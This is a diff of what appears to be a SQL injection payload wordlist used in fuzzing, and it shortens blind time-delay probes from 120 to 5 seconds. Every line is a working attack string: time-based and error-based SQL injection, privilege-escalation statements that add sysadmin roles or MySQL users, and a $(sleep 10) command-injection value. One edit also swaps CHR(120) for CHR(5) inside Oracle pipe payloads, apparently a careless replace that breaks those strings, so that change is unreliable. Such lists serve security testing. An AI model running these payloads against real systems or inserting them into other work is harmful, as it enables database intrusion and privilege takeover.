@@ -2,19 +2,19 @@
  and 0=benchmark(3000000,MD5(1))%20--
  and 0=benchmark(3000000,MD5(1))%20/*
  and 0=benchmark(3000000,MD5(1))%20%23
- and 1337=(select 1337 from (select sleep(120))A)
- and 1337=(select 1337 from (select sleep(120))A) -- 
- and sleep(120)
- and sleep(120) -- 
- or 1337=(select 1337 from (select sleep(120))A)
- or 1337=(select 1337 from (select sleep(120))A) -- 
- or sleep(120)
- or sleep(120) -- 
+ and 1337=(select 1337 from (select sleep(5))A)
+ and 1337=(select 1337 from (select sleep(5))A) -- 
+ and sleep(5)
+ and sleep(5) -- 
+ or 1337=(select 1337 from (select sleep(5))A)
+ or 1337=(select 1337 from (select sleep(5))A) -- 
+ or sleep(5)
+ or sleep(5) -- 
 ,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
 ,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
 ,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
-;select sleep(120)
-;select sleep(120) -- 
+;select sleep(5)
+;select sleep(5) -- 
 ;WAITFOR DELAY '0:0:10'
 ;waitfor delay '0:0:10'--
 ;WAITFOR DELAY '0:0:10'--
@@ -27,7 +27,7 @@
 ' and 0=benchmark(3000000,MD5(1))%20--
 ' and 0=benchmark(3000000,MD5(1))%20/*
 ' and 0=benchmark(3000000,MD5(1))%20%23
-' and 1337=(select 1337 from (select sleep(120))A) -- 
+' and 1337=(select 1337 from (select sleep(5))A) -- 
 ' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
@@ -43,15 +43,15 @@
 ' and sleep(10) and '1'='1
 ' and sleep(10)--
 ' AND SLEEP(10)#
-' and sleep(120) -- 
+' and sleep(5) -- 
 ' exec sp_addsrvrolemember 'name' , 'sysadmin' --
 ' grant connect to name; grant resource to name; --
 ' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
 ' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
 ' or 1=1 --
-' or 1337=(select 1337 from (select sleep(120))A) -- 
+' or 1337=(select 1337 from (select sleep(5))A) -- 
 ' OR SLEEP(10)#
-' or sleep(120) -- 
+' or sleep(5) -- 
 ' or username is not NULL or username = '
 ' RLIKE SLEEP(10) AND '1337' LIKE '1337
 ' RLIKE SLEEP(10) AND '1337'='1337
@@ -85,7 +85,7 @@
 '; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
 '; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
 ';%5waitfor%5delay%5'0:0:10'%5--%5
-';select sleep(120) -- 
+';select sleep(5) -- 
 ';waitfor delay '0:0:10'--
 ') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ('1337'='1337
 ') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ('PBiy'='PBiy
@@ -340,191 +340,191 @@
 )))) and 0=benchmark(3000000,MD5(1))%20%23
 ]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY))|[1
 ]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))|[1
-\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\' and sleep(120) -- 
-\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\' or sleep(120) -- 
+\' and 1337=(select 1337 from (select sleep(5))A) -- 
+\' and sleep(5) -- 
+\' or 1337=(select 1337 from (select sleep(5))A) -- 
+\' or sleep(5) -- 
 \'; desc users; --
-\';select sleep(120) -- 
-\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\' and sleep(120) -- 
-\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\' or sleep(120) -- 
-\\';select sleep(120) -- 
-\\n and 1337=(select 1337 from (select sleep(120))A)
-\\n and 1337=(select 1337 from (select sleep(120))A) -- 
-\\n and sleep(120)
-\\n and sleep(120) -- 
-\\n or 1337=(select 1337 from (select sleep(120))A)
-\\n or 1337=(select 1337 from (select sleep(120))A) -- 
-\\n or sleep(120)
-\\n or sleep(120) -- 
-\\n;select sleep(120)
-\\n;select sleep(120) -- 
-\\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\n' and sleep(120) -- 
-\\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\n' or sleep(120) -- 
-\\n';select sleep(120) -- 
-\\n\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\n\\' and sleep(120) -- 
-\\n\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\n\\' or sleep(120) -- 
-\\n\\';select sleep(120) -- 
-\\nsleep(120)
-\\nsleep(120) -- 
-\\r\\n and 1337=(select 1337 from (select sleep(120))A)
-\\r\\n and 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n and sleep(120)
-\\r\\n and sleep(120) -- 
-\\r\\n or 1337=(select 1337 from (select sleep(120))A)
-\\r\\n or 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n or sleep(120)
-\\r\\n or sleep(120) -- 
-\\r\\n;select sleep(120)
-\\r\\n;select sleep(120) -- 
-\\r\\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n' and sleep(120) -- 
-\\r\\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n' or sleep(120) -- 
-\\r\\n';select sleep(120) -- 
-\\r\\n\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n\\' and sleep(120) -- 
-\\r\\n\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n\\' or sleep(120) -- 
-\\r\\n\\';select sleep(120) -- 
-\\r\\nsleep(120)
-\\r\\nsleep(120) -- 
-\n and 1337=(select 1337 from (select sleep(120))A)
-\n and 1337=(select 1337 from (select sleep(120))A) -- 
-\n and sleep(120)
-\n and sleep(120) -- 
-\n or 1337=(select 1337 from (select sleep(120))A)
-\n or 1337=(select 1337 from (select sleep(120))A) -- 
-\n or sleep(120)
-\n or sleep(120) -- 
-\n;select sleep(120)
-\n;select sleep(120) -- 
-\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\n' and sleep(120) -- 
-\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\n' or sleep(120) -- 
-\n';select sleep(120) -- 
-\n\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\n\' and sleep(120) -- 
-\n\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\n\' or sleep(120) -- 
-\n\';select sleep(120) -- 
-\nsleep(120)
-\nsleep(120) -- 
-\r\n and 1337=(select 1337 from (select sleep(120))A)
-\r\n and 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n and sleep(120)
-\r\n and sleep(120) -- 
-\r\n or 1337=(select 1337 from (select sleep(120))A)
-\r\n or 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n or sleep(120)
-\r\n or sleep(120) -- 
-\r\n;select sleep(120)
-\r\n;select sleep(120) -- 
-\r\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n' and sleep(120) -- 
-\r\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n' or sleep(120) -- 
-\r\n';select sleep(120) -- 
-\r\n\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n\' and sleep(120) -- 
-\r\n\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n\' or sleep(120) -- 
-\r\n\';select sleep(120) -- 
-\r\nsleep(120)
-\r\nsleep(120) -- 
+\';select sleep(5) -- 
+\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+\\' and sleep(5) -- 
+\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+\\' or sleep(5) -- 
+\\';select sleep(5) -- 
+\\n and 1337=(select 1337 from (select sleep(5))A)
+\\n and 1337=(select 1337 from (select sleep(5))A) -- 
+\\n and sleep(5)
+\\n and sleep(5) -- 
+\\n or 1337=(select 1337 from (select sleep(5))A)
+\\n or 1337=(select 1337 from (select sleep(5))A) -- 
+\\n or sleep(5)
+\\n or sleep(5) -- 
+\\n;select sleep(5)
+\\n;select sleep(5) -- 
+\\n' and 1337=(select 1337 from (select sleep(5))A) -- 
+\\n' and sleep(5) -- 
+\\n' or 1337=(select 1337 from (select sleep(5))A) -- 
+\\n' or sleep(5) -- 
+\\n';select sleep(5) -- 
+\\n\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+\\n\\' and sleep(5) -- 
+\\n\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+\\n\\' or sleep(5) -- 
+\\n\\';select sleep(5) -- 
+\\nsleep(5)
+\\nsleep(5) -- 
+\\r\\n and 1337=(select 1337 from (select sleep(5))A)
+\\r\\n and 1337=(select 1337 from (select sleep(5))A) -- 
+\\r\\n and sleep(5)
+\\r\\n and sleep(5) -- 
+\\r\\n or 1337=(select 1337 from (select sleep(5))A)
+\\r\\n or 1337=(select 1337 from (select sleep(5))A) -- 
+\\r\\n or sleep(5)
+\\r\\n or sleep(5) -- 
+\\r\\n;select sleep(5)
+\\r\\n;select sleep(5) -- 
+\\r\\n' and 1337=(select 1337 from (select sleep(5))A) -- 
+\\r\\n' and sleep(5) -- 
+\\r\\n' or 1337=(select 1337 from (select sleep(5))A) -- 
+\\r\\n' or sleep(5) -- 
+\\r\\n';select sleep(5) -- 
+\\r\\n\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+\\r\\n\\' and sleep(5) -- 
+\\r\\n\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+\\r\\n\\' or sleep(5) -- 
+\\r\\n\\';select sleep(5) -- 
+\\r\\nsleep(5)
+\\r\\nsleep(5) -- 
+\n and 1337=(select 1337 from (select sleep(5))A)
+\n and 1337=(select 1337 from (select sleep(5))A) -- 
+\n and sleep(5)
+\n and sleep(5) -- 
+\n or 1337=(select 1337 from (select sleep(5))A)
+\n or 1337=(select 1337 from (select sleep(5))A) -- 
+\n or sleep(5)
+\n or sleep(5) -- 
+\n;select sleep(5)
+\n;select sleep(5) -- 
+\n' and 1337=(select 1337 from (select sleep(5))A) -- 
+\n' and sleep(5) -- 
+\n' or 1337=(select 1337 from (select sleep(5))A) -- 
+\n' or sleep(5) -- 
+\n';select sleep(5) -- 
+\n\' and 1337=(select 1337 from (select sleep(5))A) -- 
+\n\' and sleep(5) -- 
+\n\' or 1337=(select 1337 from (select sleep(5))A) -- 
+\n\' or sleep(5) -- 
+\n\';select sleep(5) -- 
+\nsleep(5)
+\nsleep(5) -- 
+\r\n and 1337=(select 1337 from (select sleep(5))A)
+\r\n and 1337=(select 1337 from (select sleep(5))A) -- 
+\r\n and sleep(5)
+\r\n and sleep(5) -- 
+\r\n or 1337=(select 1337 from (select sleep(5))A)
+\r\n or 1337=(select 1337 from (select sleep(5))A) -- 
+\r\n or sleep(5)
+\r\n or sleep(5) -- 
+\r\n;select sleep(5)
+\r\n;select sleep(5) -- 
+\r\n' and 1337=(select 1337 from (select sleep(5))A) -- 
+\r\n' and sleep(5) -- 
+\r\n' or 1337=(select 1337 from (select sleep(5))A) -- 
+\r\n' or sleep(5) -- 
+\r\n';select sleep(5) -- 
+\r\n\' and 1337=(select 1337 from (select sleep(5))A) -- 
+\r\n\' and sleep(5) -- 
+\r\n\' or 1337=(select 1337 from (select sleep(5))A) -- 
+\r\n\' or sleep(5) -- 
+\r\n\';select sleep(5) -- 
+\r\nsleep(5)
+\r\nsleep(5) -- 
 %' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337%'='1337
 %' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337
 %' AND ELT(1337=1337,SLEEP(10)) AND '1337%'='1337
 %' RLIKE SLEEP(10) AND '1337%'='1337
 %' WAITFOR DELAY '0:0:10'--
-%00 and 1337=(select 1337 from (select sleep(120))A)
-%00 and 1337=(select 1337 from (select sleep(120))A) -- 
-%00 and sleep(120)
-%00 and sleep(120) -- 
-%00 or 1337=(select 1337 from (select sleep(120))A)
-%00 or 1337=(select 1337 from (select sleep(120))A) -- 
-%00 or sleep(120)
-%00 or sleep(120) -- 
-%00;select sleep(120)
-%00;select sleep(120) -- 
-%00' and 1337=(select 1337 from (select sleep(120))A) -- 
-%00' and sleep(120) -- 
-%00' or 1337=(select 1337 from (select sleep(120))A) -- 
-%00' or sleep(120) -- 
-%00';select sleep(120) -- 
-%00\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%00\' and sleep(120) -- 
-%00\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%00\' or sleep(120) -- 
-%00\';select sleep(120) -- 
-%00\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%00\\' and sleep(120) -- 
-%00\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%00\\' or sleep(120) -- 
-%00\\';select sleep(120) -- 
-%00sleep(120)
-%00sleep(120) -- 
-%0a and 1337=(select 1337 from (select sleep(120))A)
-%0a and 1337=(select 1337 from (select sleep(120))A) -- 
-%0a and sleep(120)
-%0a and sleep(120) -- 
-%0a or 1337=(select 1337 from (select sleep(120))A)
-%0a or 1337=(select 1337 from (select sleep(120))A) -- 
-%0a or sleep(120)
-%0a or sleep(120) -- 
-%0a;select sleep(120)
-%0a;select sleep(120) -- 
-%0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0a' and sleep(120) -- 
-%0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0a' or sleep(120) -- 
-%0a';select sleep(120) -- 
-%0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\' and sleep(120) -- 
-%0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\' or sleep(120) -- 
-%0a\';select sleep(120) -- 
-%0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\\' and sleep(120) -- 
-%0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\\' or sleep(120) -- 
-%0a\\';select sleep(120) -- 
-%0asleep(120)
-%0asleep(120) -- 
-%0d%0a and 1337=(select 1337 from (select sleep(120))A)
-%0d%0a and 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a and sleep(120)
-%0d%0a and sleep(120) -- 
-%0d%0a or 1337=(select 1337 from (select sleep(120))A)
-%0d%0a or 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a or sleep(120)
-%0d%0a or sleep(120) -- 
-%0d%0a;select sleep(120)
-%0d%0a;select sleep(120) -- 
-%0d%0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a' and sleep(120) -- 
-%0d%0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a' or sleep(120) -- 
-%0d%0a';select sleep(120) -- 
-%0d%0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\' and sleep(120) -- 
-%0d%0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\' or sleep(120) -- 
-%0d%0a\';select sleep(120) -- 
-%0d%0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\\' and sleep(120) -- 
-%0d%0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\\' or sleep(120) -- 
-%0d%0a\\';select sleep(120) -- 
-%0d%0asleep(120)
-%0d%0asleep(120) -- 
+%00 and 1337=(select 1337 from (select sleep(5))A)
+%00 and 1337=(select 1337 from (select sleep(5))A) -- 
+%00 and sleep(5)
+%00 and sleep(5) -- 
+%00 or 1337=(select 1337 from (select sleep(5))A)
+%00 or 1337=(select 1337 from (select sleep(5))A) -- 
+%00 or sleep(5)
+%00 or sleep(5) -- 
+%00;select sleep(5)
+%00;select sleep(5) -- 
+%00' and 1337=(select 1337 from (select sleep(5))A) -- 
+%00' and sleep(5) -- 
+%00' or 1337=(select 1337 from (select sleep(5))A) -- 
+%00' or sleep(5) -- 
+%00';select sleep(5) -- 
+%00\' and 1337=(select 1337 from (select sleep(5))A) -- 
+%00\' and sleep(5) -- 
+%00\' or 1337=(select 1337 from (select sleep(5))A) -- 
+%00\' or sleep(5) -- 
+%00\';select sleep(5) -- 
+%00\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+%00\\' and sleep(5) -- 
+%00\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+%00\\' or sleep(5) -- 
+%00\\';select sleep(5) -- 
+%00sleep(5)
+%00sleep(5) -- 
+%0a and 1337=(select 1337 from (select sleep(5))A)
+%0a and 1337=(select 1337 from (select sleep(5))A) -- 
+%0a and sleep(5)
+%0a and sleep(5) -- 
+%0a or 1337=(select 1337 from (select sleep(5))A)
+%0a or 1337=(select 1337 from (select sleep(5))A) -- 
+%0a or sleep(5)
+%0a or sleep(5) -- 
+%0a;select sleep(5)
+%0a;select sleep(5) -- 
+%0a' and 1337=(select 1337 from (select sleep(5))A) -- 
+%0a' and sleep(5) -- 
+%0a' or 1337=(select 1337 from (select sleep(5))A) -- 
+%0a' or sleep(5) -- 
+%0a';select sleep(5) -- 
+%0a\' and 1337=(select 1337 from (select sleep(5))A) -- 
+%0a\' and sleep(5) -- 
+%0a\' or 1337=(select 1337 from (select sleep(5))A) -- 
+%0a\' or sleep(5) -- 
+%0a\';select sleep(5) -- 
+%0a\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+%0a\\' and sleep(5) -- 
+%0a\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+%0a\\' or sleep(5) -- 
+%0a\\';select sleep(5) -- 
+%0asleep(5)
+%0asleep(5) -- 
+%0d%0a and 1337=(select 1337 from (select sleep(5))A)
+%0d%0a and 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a and sleep(5)
+%0d%0a and sleep(5) -- 
+%0d%0a or 1337=(select 1337 from (select sleep(5))A)
+%0d%0a or 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a or sleep(5)
+%0d%0a or sleep(5) -- 
+%0d%0a;select sleep(5)
+%0d%0a;select sleep(5) -- 
+%0d%0a' and 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a' and sleep(5) -- 
+%0d%0a' or 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a' or sleep(5) -- 
+%0d%0a';select sleep(5) -- 
+%0d%0a\' and 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a\' and sleep(5) -- 
+%0d%0a\' or 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a\' or sleep(5) -- 
+%0d%0a\';select sleep(5) -- 
+%0d%0a\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a\\' and sleep(5) -- 
+%0d%0a\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+%0d%0a\\' or sleep(5) -- 
+%0d%0a\\';select sleep(5) -- 
+%0d%0asleep(5)
+%0d%0asleep(5) -- 
 %20'sleep%2010'
 %20$(sleep%2010)
 ` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
@@ -572,7 +572,7 @@
 ||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))||
 0 AND (SELECT 6391 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (6391=6391) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
 0 AND (SELECT 7766 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (7766=7766) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-0 AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(120),5)
+0 AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(5),5)
 0 AND 1535=CONVERT(INT,(CHAR(58)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(58)+(SELECT (CASE WHEN (1535=1535) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(116)+CHAR(117)+CHAR(58)))
 0 AND 2453=CAST(CHR(58)||CHR(113)||CHR(99)||CHR(105)||CHR(58)||(SELECT (CASE WHEN (2453=2453) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(111)||CHR(116)||CHR(117)||CHR(58) AS NUMERIC)
 0 AND 2481=(SELECT 2481 FROM PG_SLEEP(5))
@@ -615,7 +615,7 @@
 0; WAITFOR DELAY '0:0:5';--
 0' AND (SELECT 6391 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (6391=6391) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'FNMO'='FNMO
 0' AND (SELECT 7766 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (7766=7766) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'iXui'='iXui
-0' AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(120),5) AND 'ZYux'='ZYux
+0' AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(5),5) AND 'ZYux'='ZYux
 0' AND 1535=CONVERT(INT,(CHAR(58)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(58)+(SELECT (CASE WHEN (1535=1535) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(116)+CHAR(117)+CHAR(58))) AND 'lFbm'='lFbm
 0' AND 2453=CAST(CHR(58)||CHR(113)||CHR(99)||CHR(105)||CHR(58)||(SELECT (CASE WHEN (2453=2453) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(111)||CHR(116)||CHR(117)||CHR(58) AS NUMERIC) AND 'cBdF'='cBdF
 0' AND 2481=(SELECT 2481 FROM PG_SLEEP(5)) AND 'lSRI'='lSRI
@@ -683,7 +683,7 @@
 0'; WAITFOR DELAY '0:0:5';-- AND 'tovU'='tovU
 0') AND (SELECT 6391 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (6391=6391) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ('iQGU'='iQGU
 0') AND (SELECT 7766 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (7766=7766) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ('NwUt'='NwUt
-0') AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(120),5) AND ('DNvp'='DNvp
+0') AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(5),5) AND ('DNvp'='DNvp
 0') AND 1535=CONVERT(INT,(CHAR(58)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(58)+(SELECT (CASE WHEN (1535=1535) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(116)+CHAR(117)+CHAR(58))) AND ('GPpa'='GPpa
 0') AND 2453=CAST(CHR(58)||CHR(113)||CHR(99)||CHR(105)||CHR(58)||(SELECT (CASE WHEN (2453=2453) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(111)||CHR(116)||CHR(117)||CHR(58) AS NUMERIC) AND ('WJJX'='WJJX
 0') AND 2481=(SELECT 2481 FROM PG_SLEEP(5)) AND ('vRHi'='vRHi
@@ -753,7 +753,7 @@
 0")"'''()''
 0) AND (SELECT 6391 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (6391=6391) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (7149=7149
 0) AND (SELECT 7766 FROM(SELECT COUNT(*),CONCAT(CHAR(58,113,99,105,58),(SELECT (CASE WHEN (7766=7766) THEN 1 ELSE 0 END)),CHAR(58,111,116,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (8110=8110
-0) AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(120),5) AND (6784=6784
+0) AND 1489=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(77)||CHR(5),5) AND (6784=6784
 0) AND 1535=CONVERT(INT,(CHAR(58)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(58)+(SELECT (CASE WHEN (1535=1535) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(116)+CHAR(117)+CHAR(58))) AND (5309=5309
 0) AND 2453=CAST(CHR(58)||CHR(113)||CHR(99)||CHR(105)||CHR(58)||(SELECT (CASE WHEN (2453=2453) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(111)||CHR(116)||CHR(117)||CHR(58) AS NUMERIC) AND (3965=3965
 0) AND 2481=(SELECT 2481 FROM PG_SLEEP(5)) AND (2313=2313
@@ -819,87 +819,87 @@
 0); SELECT SLEEP(5);--  AND (3456=3456
 0); WAITFOR DELAY '0:0:5';-- AND (1694=1694
 0); WAITFOR DELAY '0:0:5';-- AND (3737=3737
-0x00 and 1337=(select 1337 from (select sleep(120))A)
-0x00 and 1337=(select 1337 from (select sleep(120))A) -- 
-0x00 and sleep(120)
-0x00 and sleep(120) -- 
-0x00 or 1337=(select 1337 from (select sleep(120))A)
-0x00 or 1337=(select 1337 from (select sleep(120))A) -- 
-0x00 or sleep(120)
-0x00 or sleep(120) -- 
-0x00;select sleep(120)
-0x00;select sleep(120) -- 
-0x00' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x00' and sleep(120) -- 
-0x00' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x00' or sleep(120) -- 
-0x00';select sleep(120) -- 
-0x00\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\' and sleep(120) -- 
-0x00\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\' or sleep(120) -- 
-0x00\';select sleep(120) -- 
-0x00\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\\' and sleep(120) -- 
-0x00\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\\' or sleep(120) -- 
-0x00\\';select sleep(120) -- 
-0x00sleep(120)
-0x00sleep(120) -- 
-0x0a and 1337=(select 1337 from (select sleep(120))A)
-0x0a and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a and sleep(120)
-0x0a and sleep(120) -- 
-0x0a or 1337=(select 1337 from (select sleep(120))A)
-0x0a or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a or sleep(120)
-0x0a or sleep(120) -- 
-0x0a;select sleep(120)
-0x0a;select sleep(120) -- 
-0x0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a' and sleep(120) -- 
-0x0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a' or sleep(120) -- 
-0x0a';select sleep(120) -- 
-0x0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\' and sleep(120) -- 
-0x0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\' or sleep(120) -- 
-0x0a\';select sleep(120) -- 
-0x0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\\' and sleep(120) -- 
-0x0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\\' or sleep(120) -- 
-0x0a\\';select sleep(120) -- 
-0x0asleep(120)
-0x0asleep(120) -- 
-0x0d0a and 1337=(select 1337 from (select sleep(120))A)
-0x0d0a and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a and sleep(120)
-0x0d0a and sleep(120) -- 
-0x0d0a or 1337=(select 1337 from (select sleep(120))A)
-0x0d0a or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a or sleep(120)
-0x0d0a or sleep(120) -- 
-0x0d0a;select sleep(120)
-0x0d0a;select sleep(120) -- 
-0x0d0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a' and sleep(120) -- 
-0x0d0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a' or sleep(120) -- 
-0x0d0a';select sleep(120) -- 
-0x0d0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\' and sleep(120) -- 
-0x0d0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\' or sleep(120) -- 
-0x0d0a\';select sleep(120) -- 
-0x0d0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\\' and sleep(120) -- 
-0x0d0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\\' or sleep(120) -- 
-0x0d0a\\';select sleep(120) -- 
-0x0d0asleep(120)
-0x0d0asleep(120) -- 
+0x00 and 1337=(select 1337 from (select sleep(5))A)
+0x00 and 1337=(select 1337 from (select sleep(5))A) -- 
+0x00 and sleep(5)
+0x00 and sleep(5) -- 
